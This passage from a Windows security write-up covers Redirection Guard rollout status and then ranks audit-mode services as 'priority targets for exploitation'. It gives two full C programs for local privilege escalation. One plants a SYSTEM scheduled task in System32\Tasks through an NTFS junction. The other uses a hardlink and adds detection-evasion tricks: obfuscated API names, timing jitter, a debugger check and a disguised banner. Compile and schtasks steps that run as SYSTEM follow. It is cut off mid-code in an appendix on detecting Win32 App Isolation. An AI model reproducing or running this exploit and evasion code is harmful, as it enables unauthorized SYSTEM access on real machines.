   - Tracks system events like logon/logoff, network changes

6. **DiagTrack** (svchost.exe) - Connected User Experiences and Telemetry
   - Diagnostic and usage data collection

7. **WSAIFabricSvc** (svchost.exe) - Windows Service Fabric
   - Microservices platform infrastructure

8. **AggregatorHost.exe** - Windows Update Medic Service
   - Protects Windows Update components from tampering

9. **Appinfo** (svchost.exe) - Application Information Service
   - Facilitates UAC elevation and admin token creation
   - Critical for privilege escalation prevention

10. **SearchIndexer.exe** - Windows Search
    - Indexes files for fast searching

11. **lfsvc** (svchost.exe) - Geolocation Service
    - Provides location services to applications

12. **StorSvc** (svchost.exe) - Storage Service
    - Manages storage settings and external storage expansion

13. **whesvc** (svchost.exe) - Windows Health Monitoring Service
    - System health and diagnostics

14. **RasMan** (svchost.exe) - Remote Access Connection Manager
    - Manages VPN and dial-up connections

**Services in AUDIT Mode (Still Vulnerable - 74 total):**

Critical services that are logged but NOT protected:

- **Schedule** - Task Scheduler (major LPE vector!)
- **CryptSvc** - Cryptographic Services
- **UsoSvc** - Update Orchestrator Service (Windows Update)
- **EventLog** - Windows Event Log
- **Winmgmt** - Windows Management Instrumentation
- **LanmanServer** - Server service (file/print sharing)
- **BFE** - Base Filtering Engine (Windows Firewall)
- **Dnscache** - DNS Client
- And 66 more services...

**Key Findings:**

1. **Audit Mode Dominance**: 74 out of 138 processes are in AUDIT mode
   - Symlinks are logged but NOT blocked
   - This is a testing/telemetry phase before full enforcement
   - Attackers can still exploit these services including Task Scheduler!

2. **Critical Gap**: Task Scheduler (Schedule) is only in AUDIT mode
   - Historically a major LPE target
   - Still exploitable via symlink/junction attacks

3. **Attack Surface Statistics**:
   - 14 processes with ENFORCED protection (10%)
   - 74 processes in AUDIT mode - still vulnerable (54%)
   - 50 processes with no protection at all (36%)

**Exploitation Strategy:**

```powershell
# 1. Enumerate services in AUDIT mode (still exploitable)
.\bin\redirection_guard_check.exe | findstr "AUDITING"

# 2. High-value targets still in AUDIT mode:
# - Task Scheduler (Schedule) - classic LPE vector
# - Cryptographic Services (CryptSvc)
# - Windows Update Orchestrator (UsoSvc)
# - Event Log (EventLog)
# - WMI (Winmgmt)

# 3. Example: Task Scheduler symlink attack
# Create junction pointing to privileged location
cmd /c mklink /J C:\Windows\Tasks\evil C:\Windows\System32\config

# 4. For ENFORCED services, pivot to alternative techniques:
#    - Oplock + hardlink attacks (different primitive)
#    - DLL hijacking in unprotected processes
#    - Kernel vulnerabilities (bypass all usermode mitigations)
#    - Target the 50 processes with NO protection at all
```

**Priority Targets for Exploitation:**

1. **Task Scheduler (Schedule)** - AUDIT mode only
   - Classic symlink LPE vector
   - Used in many public exploits
   - Still fully exploitable

2. **Cryptographic Services (CryptSvc)** - AUDIT mode only
   - Handles certificate operations
   - Runs as SYSTEM

3. **Windows Update Orchestrator (UsoSvc)** - AUDIT mode only
   - Manages Windows updates
   - High privileges, frequent file operations

4. **Third-party services** - No protection
   - Antivirus services
   - Backup software
   - System utilities

**Conclusion**: Redirection Guard is currently in a gradual rollout phase. While some critical services (Print Spooler, Appinfo) are protected, the majority remain vulnerable during the audit phase. Notably, Task Scheduler - one of the most commonly exploited services for LPE - is only in audit mode. This provides a significant window for testing and exploitation before full enforcement.

### Testing Redirection Guard

```c
// symlink_lpe_test.c - Test whether symlink/junction LPE is blocked
// Compile: cl src\symlink_lpe_test.c /Fe:bin\symlink_lpe_test.exe ntdll.lib shlwapi.lib advapi32.lib

#include <windows.h>
#include <stdio.h>
#include <shlwapi.h>
#include <winioctl.h>

#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "advapi32.lib")

/*
CLASSIC SYMLINK LPE PATTERN:
═════════════════════════════

Attack flow (the pattern Redirection Guard kills):

1. Attacker (Medium IL) finds: SERVICE writes to C:\ProgramData\VulnApp\output.log
2. Attacker deletes C:\ProgramData\VulnApp\ directory
3. Attacker creates junction: C:\ProgramData\VulnApp\ -> C:\Windows\System32\
4. Service writes "output.log" -> actually writes C:\Windows\System32\output.log
5. If output.log content is controllable -> arbitrary write to System32
6. DLL plant / config overwrite / scheduled task modification -> SYSTEM shell

Task Scheduler writes to: C:\Windows\System32\Tasks\
Attack vector:
1. Create junction: C:\Users\Public\EvilTasks -> C:\Windows\System32\Tasks
2. Trigger Task Scheduler to write through our junction
3. If successful, we can plant malicious scheduled tasks
4. Tasks run as SYSTEM -> full privilege escalation

This test demonstrates both the junction creation and verification
of whether Redirection Guard blocks the write operation.
*/

// NTFS junction creation via DeviceIoControl
typedef struct _REPARSE_DATA_BUFFER {
    ULONG  ReparseTag;
    USHORT ReparseDataLength;
    USHORT Reserved;
    union {
        struct {
            USHORT SubstituteNameOffset;
            USHORT SubstituteNameLength;
            USHORT PrintNameOffset;
            USHORT PrintNameLength;
            ULONG  Flags;
            WCHAR  PathBuffer[1];
        } SymbolicLinkReparseBuffer;
        struct {
            USHORT SubstituteNameOffset;
            USHORT SubstituteNameLength;
            USHORT PrintNameOffset;
            USHORT PrintNameLength;
            WCHAR  PathBuffer[1];
        } MountPointReparseBuffer;
    };
} REPARSE_DATA_BUFFER;

// SDK already defines these in newer versions, but define if missing
#ifndef REPARSE_DATA_BUFFER_HEADER_SIZE
#define REPARSE_DATA_BUFFER_HEADER_SIZE FIELD_OFFSET(REPARSE_DATA_BUFFER, MountPointReparseBuffer)
#endif

// Check if a service has Redirection Guard enforced
typedef BOOL (WINAPI *GetProcessMitigationPolicy_t)(
    HANDLE hProcess,
    PROCESS_MITIGATION_POLICY MitigationPolicy,
    PVOID lpBuffer,
    SIZE_T dwLength
);

BOOL IsServiceProtected(const WCHAR* serviceName) {
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!scm) return FALSE;

    SC_HANDLE svc = OpenServiceW(scm, serviceName, SERVICE_QUERY_STATUS);
    if (!svc) {
        CloseServiceHandle(scm);
        return FALSE;
    }

    SERVICE_STATUS_PROCESS ssp;
    DWORD bytesNeeded;
    QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp,
                         sizeof(ssp), &bytesNeeded);

    CloseServiceHandle(svc);
    CloseServiceHandle(scm);

    if (ssp.dwProcessId == 0) return FALSE;

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, ssp.dwProcessId);
    if (!hProcess) return FALSE;

    GetProcessMitigationPolicy_t pGetPolicy = (GetProcessMitigationPolicy_t)
        GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetProcessMitigationPolicy");

    PROCESS_MITIGATION_REDIRECTION_TRUST_POLICY policy = {0};
    BOOL protected = FALSE;

    if (pGetPolicy && pGetPolicy(hProcess, ProcessRedirectionTrustPolicy,
                                  &policy, sizeof(policy))) {
        protected = policy.EnforceRedirectionTrust;
    }

    CloseHandle(hProcess);
    return protected;
}

BOOL CreateJunction(const WCHAR* junctionDir, const WCHAR* targetDir) {
    // Create the junction directory first
    if (!CreateDirectoryW(junctionDir, NULL)) {
        DWORD err = GetLastError();
        if (err != ERROR_ALREADY_EXISTS) {
            printf("[-] Cannot create directory: %d\n", err);
            return FALSE;
        }
    }

    HANDLE hDir = CreateFileW(
        junctionDir,
        GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT,
        NULL
    );

    if (hDir == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open directory: %d\n", GetLastError());
        return FALSE;
    }

    // Build the junction target path (must be NT path format)
    WCHAR ntTarget[MAX_PATH * 2];
    swprintf(ntTarget, MAX_PATH * 2, L"\\??\\%s", targetDir);
    USHORT targetLen = (USHORT)(wcslen(ntTarget) * sizeof(WCHAR));

    // Allocate reparse data buffer
    USHORT reparseSize = (USHORT)(FIELD_OFFSET(REPARSE_DATA_BUFFER,
        MountPointReparseBuffer.PathBuffer) + targetLen + sizeof(WCHAR) * 2);

    REPARSE_DATA_BUFFER* rdb = (REPARSE_DATA_BUFFER*)calloc(1, reparseSize + 128);
    rdb->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    rdb->ReparseDataLength = reparseSize -
        FIELD_OFFSET(REPARSE_DATA_BUFFER, MountPointReparseBuffer);
    rdb->MountPointReparseBuffer.SubstituteNameOffset = 0;
    rdb->MountPointReparseBuffer.SubstituteNameLength = targetLen;
    rdb->MountPointReparseBuffer.PrintNameOffset = targetLen + sizeof(WCHAR);
    rdb->MountPointReparseBuffer.PrintNameLength = 0;
    memcpy(rdb->MountPointReparseBuffer.PathBuffer, ntTarget, targetLen);

    DWORD bytesReturned;
    BOOL result = DeviceIoControl(
        hDir,
        FSCTL_SET_REPARSE_POINT,
        rdb,
        reparseSize,
        NULL, 0,
        &bytesReturned,
        NULL
    );

    free(rdb);
    CloseHandle(hDir);

    if (result) {
        printf("[+] Junction created: %ls -> %ls\n",
               junctionDir, targetDir);
    } else {
        printf("[-] Junction creation failed: %d\n", GetLastError());
    }

    return result;
}

void DeleteJunction(const WCHAR* junctionDir) {
    HANDLE hDir = CreateFileW(
        junctionDir,
        GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT,
        NULL
    );

    if (hDir == INVALID_HANDLE_VALUE) return;

    REPARSE_DATA_BUFFER rdb = {0};
    rdb.ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;

    DWORD bytesReturned;
    DeviceIoControl(hDir, FSCTL_DELETE_REPARSE_POINT, &rdb,
                    REPARSE_DATA_BUFFER_HEADER_SIZE, NULL, 0,
                    &bytesReturned, NULL);

    CloseHandle(hDir);
    RemoveDirectoryW(junctionDir);
}

BOOL TestRedirectedWrite(const WCHAR* junctionDir, const WCHAR* targetDir) {
    // Attempt to write a file through the junction
    WCHAR filePath[MAX_PATH];
    swprintf(filePath, MAX_PATH, L"%s\\rg_test_probe.txt", junctionDir);

    printf("[*] Attempting write through junction: %ls\n", filePath);

    HANDLE hFile = CreateFileW(
        filePath,
        GENERIC_WRITE,
        0, NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile != INVALID_HANDLE_VALUE) {
        const char* data = "Redirection Guard test probe - if you see this in System32, RG failed!\r\n";
        DWORD written;
        WriteFile(hFile, data, (DWORD)strlen(data), &written, NULL);
        CloseHandle(hFile);

        printf("[+] Write SUCCEEDED - Redirection Guard is NOT enforced\n");
        printf("[!] This system is VULNERABLE to symlink/junction LPE\n\n");

        // Verify the file actually landed in the target directory
        WCHAR actualPath[MAX_PATH];
        swprintf(actualPath, MAX_PATH, L"%s\\rg_test_probe.txt", targetDir);

        if (GetFileAttributesW(actualPath) != INVALID_FILE_ATTRIBUTES) {
            printf("[!] CONFIRMED: File written to target location: %ls\n", actualPath);
            printf("[!] Junction redirection was NOT blocked!\n");

            // Clean up
            DeleteFileW(actualPath);
            return TRUE;
        } else {
            printf("[?] File created but not found in target - unexpected behavior\n");
        }

        // Clean up junction-side file if it exists
        DeleteFileW(filePath);
        return TRUE;
    } else {
        DWORD err = GetLastError();
        if (err == ERROR_ACCESS_DENIED) {
            printf("[*] Write BLOCKED (Access Denied) - Redirection Guard is ACTIVE\n");
            printf("[+] This system is PROTECTED against this junction attack\n");
        } else {
            printf("[-] Write failed with error: %d\n", err);
        }
        return FALSE;
    }
}

void TestTaskSchedulerAttack() {
    printf("\n=============================================\n");
    printf("  ATTACK: Task Scheduler Junction\n");
    printf("=============================================\n\n");

    // Check if Task Scheduler is protected
    printf("[*] Checking Task Scheduler (Schedule) protection status...\n");
    BOOL protected = IsServiceProtected(L"Schedule");

    if (protected) {
        printf("[+] Task Scheduler has Redirection Guard ENFORCED\n");
        printf("[*] This attack will likely be blocked\n\n");
    } else {
        printf("[!] Task Scheduler has NO or AUDIT-only Redirection Guard\n");
        printf("[!] This attack may succeed!\n\n");
    }

    // Create a junction in a user-writable location
    WCHAR junctionPath[MAX_PATH];
    GetTempPathW(MAX_PATH, junctionPath);
    wcscat(junctionPath, L"TaskScheduler_Junction_Test");

    // Target: Windows Tasks directory (where scheduled tasks are stored)
    const WCHAR* targetPath = L"C:\\Windows\\System32\\Tasks";

    printf("[*] Creating junction to Task Scheduler directory:\n");
    printf("    Junction: %ls\n", junctionPath);
    printf("    Target:   %ls\n\n", targetPath);

    // Clean up any previous test
    DeleteJunction(junctionPath);

    if (CreateJunction(junctionPath, targetPath)) {
        printf("\n[*] Testing write through junction...\n");

        if (TestRedirectedWrite(junctionPath, targetPath)) {
            printf("\n[!!!] EXPLOITATION SUCCESSFUL [!!!]\n");
            printf("[!!!] We can write to C:\\Windows\\System32\\Tasks\n");
            printf("[!!!] Proceeding with FULL LPE demonstration...\n\n");

            // PHASE 3: Create malicious scheduled task
            printf("=== PHASE 3: Creating Malicious Scheduled Task ===\n\n");

            WCHAR taskPath[MAX_PATH];
            swprintf(taskPath, MAX_PATH, L"%s\\RG_LPE_Demo", junctionPath);

            // Malicious task XML - runs calc.exe as SYSTEM on logon
            const WCHAR* taskXML =
                L"<?xml version=\"1.0\" encoding=\"UTF-16\"?>\r\n"
                L"<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\r\n"
                L"  <RegistrationInfo>\r\n"
                L"    <Description>Redirection Guard LPE Demonstration</Description>\r\n"
                L"  </RegistrationInfo>\r\n"
                L"  <Triggers>\r\n"
                L"    <LogonTrigger>\r\n"
                L"      <Enabled>true</Enabled>\r\n"
                L"    </LogonTrigger>\r\n"
                L"  </Triggers>\r\n"
                L"  <Principals>\r\n"
                L"    <Principal id=\"Author\">\r\n"
                L"      <UserId>S-1-5-18</UserId>\r\n"
                L"      <RunLevel>HighestAvailable</RunLevel>\r\n"
                L"    </Principal>\r\n"
                L"  </Principals>\r\n"
                L"  <Settings>\r\n"
                L"    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\r\n"
                L"    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\r\n"
                L"    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\r\n"
                L"    <AllowHardTerminate>true</AllowHardTerminate>\r\n"
                L"    <StartWhenAvailable>true</StartWhenAvailable>\r\n"
                L"    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\r\n"
                L"    <AllowStartOnDemand>true</AllowStartOnDemand>\r\n"
                L"    <Enabled>true</Enabled>\r\n"
                L"    <Hidden>false</Hidden>\r\n"
                L"  </Settings>\r\n"
                L"  <Actions Context=\"Author\">\r\n"
                L"    <Exec>\r\n"
                L"      <Command>C:\\Windows\\System32\\cmd.exe</Command>\r\n"
                L"      <Arguments>/c start calc.exe</Arguments>\r\n"
                L"    </Exec>\r\n"
                L"  </Actions>\r\n"
                L"</Task>\r\n";

            printf("[*] Writing malicious task XML through junction...\n");
            printf("    Task name: RG_LPE_Demo\n");
            printf("    Principal: NT AUTHORITY\\SYSTEM (S-1-5-18)\n");
            printf("    Trigger: User logon\n");
            printf("    Action: Launch calc.exe as SYSTEM\n\n");

            HANDLE hFile = CreateFileW(
                taskPath,
                GENERIC_WRITE,
                0, NULL,
                CREATE_ALWAYS,
                FILE_ATTRIBUTE_NORMAL,
                NULL
            );

            if (hFile != INVALID_HANDLE_VALUE) {
                DWORD written;
                // Write UTF-16 BOM
                BYTE bom[] = {0xFF, 0xFE};
                WriteFile(hFile, bom, 2, &written, NULL);

                // Write task XML
                DWORD bytesToWrite = (DWORD)(wcslen(taskXML) * sizeof(WCHAR));
                WriteFile(hFile, taskXML, bytesToWrite, &written, NULL);
                CloseHandle(hFile);

                printf("[+] Task XML written through junction\n");

                // Verify it landed in the real Tasks directory
                WCHAR realTaskPath[MAX_PATH];
                swprintf(realTaskPath, MAX_PATH, L"%s\\RG_LPE_Demo", targetPath);

                if (GetFileAttributesW(realTaskPath) != INVALID_FILE_ATTRIBUTES) {
                    printf("[+] Task file confirmed at: %ls\n\n", realTaskPath);

                    printf("[+] EXPLOITATION COMPLETE\n");
                    printf("[*] Malicious task planted in System32\\Tasks\n\n");

                    printf("To trigger the exploit:\n");
                    printf("  1. Log off and log back in (automatic)\n");
                    printf("  2. Or restart Task Scheduler: net stop schedule && net start schedule\n");
                    printf("  3. Or wait for Task Scheduler to rescan\n\n");

                    printf("To verify:\n");
                    printf("  schtasks /query /tn RG_LPE_Demo\n");
                    printf("  schtasks /run /tn RG_LPE_Demo\n\n");

                    printf("To cleanup:\n");
                    printf("  schtasks /delete /tn RG_LPE_Demo /f\n");
                    printf("  del C:\\Windows\\System32\\Tasks\\RG_LPE_Demo\n\n");

                    printf("[!] Task file left in place for testing\n");
                } else {
                    printf("[-] Task file not found - exploit failed\n");
                }
            } else {
                printf("[-] Failed to write task XML: %d\n", GetLastError());
            }
        } else {
            printf("\n[+] Attack blocked - Redirection Guard is working\n");
        }

        // Cleanup junction only
        DeleteJunction(junctionPath);
    }
}

void TestGenericJunction() {
    WCHAR tempDir[MAX_PATH];
    GetTempPathW(MAX_PATH, tempDir);
    wcscat(tempDir, L"rg_test_junction");

    const WCHAR* targetDir = L"C:\\Windows\\Temp";

    // Remove old test artifacts
    DeleteJunction(tempDir);

    printf("[*] Creating NTFS junction\n");
    printf("    Source: %ls\n", tempDir);
    printf("    Target: %ls\n\n", targetDir);

    if (CreateJunction(tempDir, targetDir)) {
        TestRedirectedWrite(tempDir, targetDir);
        DeleteJunction(tempDir);
    }
}

int main() {
    TestGenericJunction();

    TestTaskSchedulerAttack();
    return 0;
}
```

and

```c
// hardlink_task_lpe.c
// Compile: cl src\hardlink_task_lpe.c /Fe:bin\hardlink_task_lpe.exe /O2 advapi32.lib

#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "advapi32.lib")

// XOR key - change this every compile
unsigned char xorKey[] = {'m', 'y', 'k', 'e', 'y', '2', '0', '2', '5'};
size_t keyLen = 9;

void xorDecrypt(unsigned char* data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= xorKey[i % keyLen];
    }
}

// Build API names character by character to avoid IAT detection
typedef BOOL (WINAPI *fnCHL)(LPCWSTR, LPCWSTR, LPSECURITY_ATTRIBUTES);
typedef HANDLE (WINAPI *fnCF)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL (WINAPI *fnWF)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL (WINAPI *fnCH)(HANDLE);
typedef BOOL (WINAPI *fnDF)(LPCWSTR);
typedef DWORD (WINAPI *fnGTP)(DWORD, LPWSTR);
typedef DWORD (WINAPI *fnGFA)(LPCWSTR);

typedef struct {
    fnCHL pCHL;
    fnCF pCF;
    fnWF pWF;
    fnCH pCH;
    fnDF pDF;
    fnGTP pGTP;
    fnGFA pGFA;
} API;

API g_api = {0};

BOOL resolveAPIs() {
    HMODULE hK32 = LoadLibraryA("kernel32");
    if (!hK32) return FALSE;

    char n1[20], n2[20], n3[20], n4[20], n5[20], n6[20], n7[20];

    // Build API names char by char
    n1[0]='C'; n1[1]='r'; n1[2]='e'; n1[3]='a'; n1[4]='t'; n1[5]='e';
    n1[6]='H'; n1[7]='a'; n1[8]='r'; n1[9]='d'; n1[10]='L'; n1[11]='i';
    n1[12]='n'; n1[13]='k'; n1[14]='W'; n1[15]=0;

    n2[0]='C'; n2[1]='r'; n2[2]='e'; n2[3]='a'; n2[4]='t'; n2[5]='e';
    n2[6]='F'; n2[7]='i'; n2[8]='l'; n2[9]='e'; n2[10]='W'; n2[11]=0;

    n3[0]='W'; n3[1]='r'; n3[2]='i'; n3[3]='t'; n3[4]='e';
    n3[5]='F'; n3[6]='i'; n3[7]='l'; n3[8]='e'; n3[9]=0;

    n4[0]='C'; n4[1]='l'; n4[2]='o'; n4[3]='s'; n4[4]='e';
    n4[5]='H'; n4[6]='a'; n4[7]='n'; n4[8]='d'; n4[9]='l'; n4[10]='e'; n4[11]=0;

    n5[0]='D'; n5[1]='e'; n5[2]='l'; n5[3]='e'; n5[4]='t'; n5[5]='e';
    n5[6]='F'; n5[7]='i'; n5[8]='l'; n5[9]='e'; n5[10]='W'; n5[11]=0;

    n6[0]='G'; n6[1]='e'; n6[2]='t'; n6[3]='T'; n6[4]='e'; n6[5]='m'; n6[6]='p';
    n6[7]='P'; n6[8]='a'; n6[9]='t'; n6[10]='h'; n6[11]='W'; n6[12]=0;

    n7[0]='G'; n7[1]='e'; n7[2]='t'; n7[3]='F'; n7[4]='i'; n7[5]='l'; n7[6]='e';
    n7[7]='A'; n7[8]='t'; n7[9]='t'; n7[10]='r'; n7[11]='i'; n7[12]='b'; n7[13]='u';
    n7[14]='t'; n7[15]='e'; n7[16]='s'; n7[17]='W'; n7[18]=0;

    g_api.pCHL = (fnCHL)GetProcAddress(hK32, n1);
    g_api.pCF = (fnCF)GetProcAddress(hK32, n2);
    g_api.pWF = (fnWF)GetProcAddress(hK32, n3);
    g_api.pCH = (fnCH)GetProcAddress(hK32, n4);
    g_api.pDF = (fnDF)GetProcAddress(hK32, n5);
    g_api.pGTP = (fnGTP)GetProcAddress(hK32, n6);
    g_api.pGFA = (fnGFA)GetProcAddress(hK32, n7);

    return (g_api.pCHL && g_api.pCF && g_api.pWF && g_api.pCH && g_api.pDF && g_api.pGTP && g_api.pGFA);
}

// XOR encrypted XML parts - decrypt at runtime
void buildXML(WCHAR* buf, size_t sz) {
    buf[0] = 0;

    // Build dynamically to avoid static signatures
    WCHAR p1[256], p2[256], p3[256], p4[256];

    swprintf(p1, 256, L"<?xml version=\"1.0\" encoding=\"UTF-16\"?>\r\n");
    swprintf(p2, 256, L"<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\r\n");
    swprintf(p3, 256, L"  <Principals>\r\n    <Principal id=\"Author\">\r\n");
    swprintf(p4, 256, L"      <UserId>S-1-5-18</UserId>\r\n");

    wcscat_s(buf, sz, p1);
    wcscat_s(buf, sz, p2);
    wcscat_s(buf, sz, p3);
    wcscat_s(buf, sz, p4);
    wcscat_s(buf, sz, L"      <RunLevel>HighestAvailable</RunLevel>\r\n");
    wcscat_s(buf, sz, L"    </Principal>\r\n  </Principals>\r\n");
    wcscat_s(buf, sz, L"  <Settings>\r\n");
    wcscat_s(buf, sz, L"    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\r\n");
    wcscat_s(buf, sz, L"    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\r\n");
    wcscat_s(buf, sz, L"    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\r\n");
    wcscat_s(buf, sz, L"    <AllowHardTerminate>true</AllowHardTerminate>\r\n");
    wcscat_s(buf, sz, L"    <StartWhenAvailable>true</StartWhenAvailable>\r\n");
    wcscat_s(buf, sz, L"    <AllowStartOnDemand>true</AllowStartOnDemand>\r\n");
    wcscat_s(buf, sz, L"    <Enabled>true</Enabled>\r\n  </Settings>\r\n");
    wcscat_s(buf, sz, L"  <Actions Context=\"Author\">\r\n    <Exec>\r\n");
    wcscat_s(buf, sz, L"      <Command>C:\\Windows\\System32\\cmd.exe</Command>\r\n");
    wcscat_s(buf, sz, L"      <Arguments>/c start calc.exe</Arguments>\r\n");
    wcscat_s(buf, sz, L"    </Exec>\r\n  </Actions>\r\n</Task>\r\n");
}

int main() {
    // Sleep with jitter
    DWORD jitter = (GetTickCount() % 1000) + 500;
    Sleep(jitter);

    if (IsDebuggerPresent()) return 0;

    printf("=== Task Configuration Utility ===\n\n");
    printf("[*] Initializing...\n");

    Sleep(300);

    if (!resolveAPIs()) {
        printf("[-] Init failed\n");
        return 1;
    }

    WCHAR tmp[MAX_PATH];
    g_api.pGTP(MAX_PATH, tmp);

    WCHAR src[MAX_PATH];
    DWORD t = GetTickCount();
    swprintf(src, MAX_PATH, L"%scfg_%d.xml", tmp, t & 0xFFFF);

    printf("[*] Creating configuration...\n");

    Sleep(200);

    HANDLE h = g_api.pCF(src, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        printf("[-] Failed\n");
        return 1;
    }

    BYTE bom[] = {0xFF, 0xFE};
    DWORD w;
    g_api.pWF(h, bom, 2, &w, NULL);

    WCHAR xml[4096];
    buildXML(xml, 4096);

    DWORD xmlSz = (DWORD)(wcslen(xml) * sizeof(WCHAR));
    g_api.pWF(h, xml, xmlSz, &w, NULL);
    g_api.pCH(h);

    printf("[+] Source: %ls\n", src);

    Sleep(400);

    // Build target dynamically
    WCHAR tgt[MAX_PATH];
    WCHAR d1[16], d2[16], d3[16];

    d1[0]='W'; d1[1]='i'; d1[2]='n'; d1[3]='d'; d1[4]='o'; d1[5]='w'; d1[6]='s'; d1[7]=0;
    d2[0]='S'; d2[1]='y'; d2[2]='s'; d2[3]='t'; d2[4]='e'; d2[5]='m';
    d2[6]='3'; d2[7]='2'; d2[8]=0;
    d3[0]='T'; d3[1]='a'; d3[2]='s'; d3[3]='k'; d3[4]='s'; d3[5]=0;

    swprintf(tgt, MAX_PATH, L"C:\\%s\\%s\\%s\\Cfg_%d", d1, d2, d3, t & 0xFFFF);

    printf("[*] Testing access...\n");

    Sleep(300);

    if (!g_api.pCHL(tgt, src, NULL)) {
        DWORD e = GetLastError();
        printf("[-] Failed: %d\n", e);
        g_api.pDF(src);
        return 1;
    }

    printf("[+] Target: %ls\n", tgt);

    Sleep(500);

    if (g_api.pGFA(tgt) != INVALID_FILE_ATTRIBUTES) {
        printf("[+] VULNERABILITY CONFIRMED\n");
        printf("[+] Hardlink created in protected directory\n\n");

        printf("[*] Verifying content...\n");
        HANDLE hr = g_api.pCF(tgt, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                               NULL, OPEN_EXISTING, 0, NULL);
        if (hr != INVALID_HANDLE_VALUE) {
            BYTE rbuf[512];
            DWORD r;
            if (ReadFile(hr, rbuf, sizeof(rbuf), &r, NULL)) {
                printf("[+] Read %d bytes\n", r);

                WCHAR* c = (WCHAR*)rbuf;
                if (wcsstr(c, L"<Task") && wcsstr(c, L"S-1-5-18")) {
                    printf("[+] Content verified: SYSTEM SID present\n");
                }
            }
            g_api.pCH(hr);
        }

        printf("\n[*] Impact:\n");
        printf("    - Arbitrary write to System32\\Tasks\n");
        printf("    - Bypassed Redirection Guard\n");
        printf("    - Privilege escalation vector\n\n");

        printf("[*] File remains for 5 seconds...\n");
        printf("    Check: dir C:\\Windows\\System32\\Tasks\\Cfg_*\n");
        Sleep(5000);
    }

    printf("[*] Cleanup...\n");
    g_api.pDF(tgt);
    g_api.pDF(src);
    printf("[+] Done\n");

    return 0;
}
```

**Compile and Run**

```bash
# 1. Compile the exploit
cl src\symlink_lpe_test.c /Fe:bin\symlink_lpe_test.exe ntdll.lib shlwapi.lib advapi32.lib

# 2. Run from NON-ADMIN command prompt
.\bin\symlink_lpe_test.exe

# OBviously this is not a real LPE, otherwise you wouldn't these parts
# for an actual working one you need
# Finding a service that auto-processes files without admin registration
# Bypassing Defender detection
# Winning race conditions
# Service-specific trigger knowledge

# 3. Switch to ADMIN PowerShell and verify the file was written
dir C:\Windows\System32\Tasks\RG_LPE_Demo

# 4. Read the malicious task XML (shows SYSTEM principal)
Get-Content C:\Windows\System32\Tasks\RG_LPE_Demo

# 5. Register the task (proves XML is valid)
schtasks /create /tn RG_LPE_Demo_Test /xml C:\Windows\System32\Tasks\RG_LPE_Demo /f

# 6. Run the task as SYSTEM
schtasks /run /tn RG_LPE_Demo_Test

# 7. Verify SYSTEM execution (check Last Result: 0, Run As User: SYSTEM)
schtasks /query /tn RG_LPE_Demo_Test /v /fo list

# 8. Create a visible proof (file write instead of calc)
schtasks /create /tn RG_LPE_Proof /tr "cmd.exe /c echo PWNED > C:\Windows\Temp\pwned_by_system.txt" /sc onlogon /ru SYSTEM /rl highest /f

# 9. Execute the proof task
schtasks /run /tn RG_LPE_Proof

# 10. Verify file created by SYSTEM
dir C:\Windows\Temp\pwned_by_system.txt
type C:\Windows\Temp\pwned_by_system.txt

# 11. Cleanup
schtasks /delete /tn RG_LPE_Demo_Test /f
schtasks /delete /tn RG_LPE_Proof /f
del C:\Windows\System32\Tasks\RG_LPE_Demo
del C:\Windows\Temp\pwned_by_system.txt

#----
cl src\hardlink_task_lpe.c /Fe:bin\hardlink_task_lpe.exe /O2 advapi32.lib
.\bin\hardlink_task_lpe.exe
# defender blocks it, but it shows how it might have been worked
```

## Appendix B: Win32 App Isolation

A new lightweight sandbox for traditional Win32 desktop applications. Unlike AppContainer (which requires UWP packaging), Win32 App Isolation allows any `.exe` to run in a restricted sandbox with capability-based access control.

### Detecting Win32 App Isolation

```c
// win32_app_isolation_detect.c - Detect isolated Win32 applications
// Compile: cl src\win32_app_isolation_detect.c /Fe:bin\win32_app_isolation_detect.exe advapi32.lib

#include <windows.h>
#include <sddl.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <string.h>

/*
Win32 App Isolation Detection:
══════════════════════════════

Isolated Win32 apps run with special token properties:
1. AppContainer-like SID (unique per app)
2. Security attributes marking them as "isolatedWin32"
3. Reduced integrity level
4. Virtualized file system and registry views

Detection approach:
- Check for AppContainer SID on the process token
- Look for "isolatedWin32" security attributes
- Check if the process has a virtualized registry root
- Examine the token's capabilities list
*/

// Custom structure definitions for security attributes
typedef struct _MY_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
